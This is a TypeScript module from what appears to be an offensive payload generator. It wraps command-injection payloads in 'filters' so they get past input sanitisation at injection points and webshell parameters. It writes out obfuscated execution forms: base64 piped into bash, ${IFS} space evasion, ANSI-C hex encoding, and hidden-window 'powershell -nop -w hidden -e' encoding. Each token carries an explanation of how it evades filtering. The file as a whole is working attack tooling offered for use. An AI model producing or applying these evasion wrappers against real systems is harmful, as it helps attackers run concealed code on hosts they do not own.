import type { PasteContext } from "./context";
import { utf16leBase64 } from "./encode";
import type { PayloadPart } from "./types";

/** A wrapper that hides the payload's characters from a filtered injection point. */
export type FilterId = "off" | "b64" | "ifs" | "hex" | "ps-b64";

/** The paste contexts where a filter applies; elsewhere it is ignored. */
export const FILTER_CONTEXTS: PasteContext[] = ["injected-linux", "url-param", "webshell-param"];

const LINUX: FilterId[] = ["b64", "ifs", "hex"];

export function filterChoices(os: "linux" | "windows" | null): FilterId[] {
  if (os === "linux") return ["off", ...LINUX];
  if (os === "windows") return ["off", "ps-b64"];
  return ["off", ...LINUX, "ps-b64"];
}

/** Whether filter `f` is for payloads that run on `os`. */
export const filterFitsOs = (f: Exclude<FilterId, "off">, os: "linux" | "windows") =>
  f === "ps-b64" ? os === "windows" : os === "linux";

const utf8 = (s: string) => new TextEncoder().encode(s);
const utf8Base64 = (s: string) => {
  let bin = "";
  for (const b of utf8(s)) bin += String.fromCharCode(b);
  return btoa(bin);
};

const B64_AVOIDS = "No quotes, ;, &, > or the payload's own / reach the injection point (base64 itself only uses letters, digits, +, / and =).";

/**
 * `powershell <flags> -c "<script>"` (the script holding no "): encoding the whole line would let the outer PowerShell
 * expand the script's $variables to nothing inside the double quotes, so only <script> is encoded.
 */
const PS_C = /^powershell(?:\s+-(?!c\b|command\b)[A-Za-z]+(?:\s+[^\s"-]\S*)?)*\s+-c(?:ommand)?\s+"([^"]*)"$/i;
const psScriptOf = (raw: string) => PS_C.exec(raw.trim())?.[1] ?? raw;

/** Wraps the filled raw payload so the injection point never sees its special characters. */
export function applyFilter(raw: string, f: Exclude<FilterId, "off">): { text: string; parts: PayloadPart[]; note: string } {
  switch (f) {
    case "b64": {
      const b64 = utf8Base64(raw);
      return {
        text: `echo ${b64}|base64 -d|bash`,
        parts: [
          { token: b64, explain: `The payload as base64. ${B64_AVOIDS}` },
          { token: "base64 -d", explain: "-d: decodes it back to the payload on the target." },
          { token: "|bash", explain: "Runs the decoded payload in bash, whatever shell the injection runs." },
        ],
        note: "Base64 filter: the payload is decoded on the target and piped into bash, in place of bash -c '...'.",
      };
    }
    case "ifs": {
      const b64 = utf8Base64(raw);
      return {
        text: `echo\${IFS}${b64}|base64\${IFS}-d|bash`,
        parts: [
          { token: b64, explain: `The payload as base64. ${B64_AVOIDS}` },
          { token: "${IFS}", explain: "The shell's field separator (a space by default): stands in for every space, so no space reaches the injection point." },
          { token: "|bash", explain: "Runs the decoded payload in bash, whatever shell the injection runs." },
        ],
        note: "Base64 + ${IFS} filter: as base64, with every space written as ${IFS}.",
      };
    }
    case "hex": {
      let hex = "";
      for (const b of utf8(raw)) hex += `\\x${b.toString(16).padStart(2, "0")}`;
      return {
        text: `bash -c $'${hex}'`,
        parts: [
          { token: "$'", explain: "ANSI-C quoting: the shell turns each \\xNN into one byte of the payload before bash runs it. No payload character reaches the injection point as itself." },
          { token: "bash -c", explain: "-c: runs the decoded payload in bash." },
        ],
        note: "Hex filter: the injecting shell must understand $'…' (bash, zsh, recent dash); if nothing happens use base64.",
      };
    }
    case "ps-b64":
      return {
        text: `powershell -nop -w hidden -e ${utf16leBase64(psScriptOf(raw))}`,
        parts: [
          { token: "-nop", explain: "-nop: no profile, so nothing slows or alters the start." },
          { token: "-w hidden", explain: "-w hidden: no visible window on the target." },
          { token: "-e", explain: "-e: the argument is base64 of the UTF-16LE command, so no quotes or special characters reach the injection point." },
        ],
        note: "PowerShell base64 filter: the command runs as powershell -e (UTF-16LE base64).",
      };
  }
}
